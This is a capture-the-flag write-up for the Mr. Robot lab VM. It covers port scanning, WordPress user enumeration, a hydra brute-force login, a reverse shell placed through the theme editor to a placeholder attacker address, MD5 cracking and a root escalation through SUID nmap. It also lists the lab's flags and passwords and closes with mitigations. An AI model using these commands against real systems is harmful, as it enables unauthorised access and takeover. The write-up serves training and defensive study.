# Mr. Robot CTF — Full Write-up

> **Note:** This write-up is for personal study and portfolio. Replace any attacker-side IPs with placeholders (e.g. `<ATTACKER_IP>` or `10.10.64.***`) before publishing.

---

## TL;DR

* Lab: Mr. Robot / Pickle Rick-style vulnerable VM — target host **10.10.64.**\* (last octet masked).
* Chain: Recon → Web enumeration → WordPress auth (user `elliot`) → web shell via theme editor → local shell → crack local MD5 → user `robot` → SUID `nmap` → root.
* Flags found:

  * key-1-of-3: `073403c8a58a1f80d943455fb30724b9`
  * key-2-of-3: `822c73956184f694993bede3eb39f959`
  * key-3-of-3: `04787ddef27c3dee1ee161b21670b4e4`

---

## Environment / scope

* Attacker: Kali Linux (local).
* Target: lab VM (masked above).
* Wordlists: `fsocity.dic` (lab-provided) used for targeted guessing.
* Tools: `nmap`, `gobuster` / `ffuf`, `wpscan`, `hydra`, `john` (or `hashcat`), `nc`, `python`.

---

## 1) Reconnaissance

### 1.1 TCP port scan

Scan the target to discover services and open ports:

```bash
nmap -sC -sV -p- -oA nmap/allports 10.10.64.***
```

Look for HTTP services (80/443/8080) and note versions for further enumeration.

### 1.2 Quick web check

Open the root web page or fetch it with curl to see obvious artifacts:

```bash
curl -sS http://10.10.64.***/ | sed -n '1,120p'
```

---

## 2) Web Enumeration

### 2.1 Directory discovery

Run directory/file enumeration to find hidden files, backups and admin panels:

```bash
gobuster dir -u http://10.10.64.***/ -w /usr/share/wordlists/dirb/common.txt -t 40 -x php,txt,html
# or
ffuf -u http://10.10.64.***/FUZZ -w /root/tools/wordlists/fsocity.dic
```

### 2.2 First flag (public file)

During enumeration a publicly-accessible text file was discovered and downloaded. That file contained **key-1-of-3**:

```text
073403c8a58a1f80d943455fb30724b9
```

---

## 3) WordPress Discovery & Initial Access

### 3.1 WP discovery

A WordPress installation was present. Enumerate users:

```bash
wpscan --url http://10.10.64.***/ --enumerate u
```

Found user: `elliot`.

### 3.2 Targeted credential guessing

A lab-provided dictionary (`fsocity.dic`) contained the intended credential. Instead of blind large-scale bruteforce, deduplicate and use a targeted approach:

```bash
sort -u fsocity.dic -o fsocity_clean.dic
hydra -l elliot -P fsocity_clean.dic 10.10.64.*** http-post-form \
"/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:F=incorrect"
```

Password found: `ER28-0652` (present in `fsocity.dic`).

---

## 4) Initial shell via WordPress

### 4.1 Login and theme editor

Login to `http://10.10.64.***/wp-admin/` with the `elliot` account. Use the Theme Editor (Appearance → Theme Editor) to modify a template file (e.g., `404.php`) and insert a minimal reverse shell payload pointing to your listener at `<ATTACKER_IP>:4444`.

### 4.2 Start listener and trigger

On Kali:

```bash
nc -lvnp 4444
```

Open the modified theme file to trigger the payload:

```
http://10.10.64.***/wp-content/themes/<theme>/404.php
```

### 4.3 Stabilize shell

In the received netcat session:

```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z, then on attacker:
stty raw -echo; fg
# inside session:
export TERM=xterm
reset
```

---

## 5) Local enumeration — escalate to `robot`

### 5.1 Check home and find artifacts

```bash
whoami; id; ls -la /home
```

Found `/home/robot` containing:

* `key-2-of-3.txt` (permissions `-r--------`)
* `password.raw-md5` (an MD5 hash)

### 5.2 Crack the local MD5

Read the hash and attempt cracking with `john` using the targeted `fsocity` wordlist. When direct cracking fails, use a small custom script to try common transformations (word+username, leet, numeric suffixes). In this engagement a small self-made Python script was used to iterate reasonable candidates and found the password quickly.

Example (create `hash.txt` and run john):

```bash
echo 'c3fcd3d76192e4007dfb496cca67e13b' > hash.txt
john --format=raw-md5 --wordlist=/root/tools/wordlists/fsocity.dic hash.txt
# if not found, run the targeted custom script (described in notes)
```

Password discovered: `abcdefghijklmnopqrstuvwxyz`.

### 5.3 Switch to `robot` and retrieve flag

```bash
su robot
# password: abcdefghijklmnopqrstuvwxyz
cat /home/robot/key-2-of-3.txt
# -> 822c73956184f694993bede3eb39f959
```

---

## 6) Privilege escalation to root

### 6.1 Discover SUID binaries

Search for SUID-set files:

```bash
find / -perm -4000 -type f 2>/dev/null | less
```

Observed SUID `/usr/local/bin/nmap`.

### 6.2 Abuse `nmap` interactive mode

When `nmap` is SUID root, its interactive mode can spawn a shell:

```bash
/usr/local/bin/nmap --interactive
# at the nmap> prompt:
!sh
# or: !bash  or !/bin/sh
```

You should get a root shell.

### 6.3 Read root flag

```bash
id  # must show uid=0(root)
cat /root/key-3-of-3.txt
# -> 04787ddef27c3dee1ee161b21670b4e4
```

---

## 7) Cleanup & responsible handling

Remove any payloads you inserted and restore files you edited (theme files). Example:

```bash
# inspect and restore 404.php
sed -n '1,120p' /var/www/html/wp-content/themes/twentyfifteen/404.php
# edit or restore from a backup; delete temp uploads
rm /tmp/my_upload.zip 2>/dev/null || true
```

---

## 8) Lessons learned & mitigations

* Use targeted wordlists and transformations instead of blind, large-scale brute-force.
* Disable theme/plugin file editing in production WordPress via `define('DISALLOW_FILE_EDIT', true);` in `wp-config.php`.
* Remove unnecessary SUID bits and restrict interactive SUID binaries; monitor for misconfigurations.
* Do not leave credential artifacts (hashes, keys) in home directories.

---

## Appendix — references & notes

* A custom Python script was used for targeted hash candidate generation (combinations, leet, suffixes). The script is not included here, but it was a simple, single-file utility used only in this engagement.
* Keep attacker-side IPs and credentials out of public repos; use placeholders or mask the address ranges.

---

*End of write-up.*
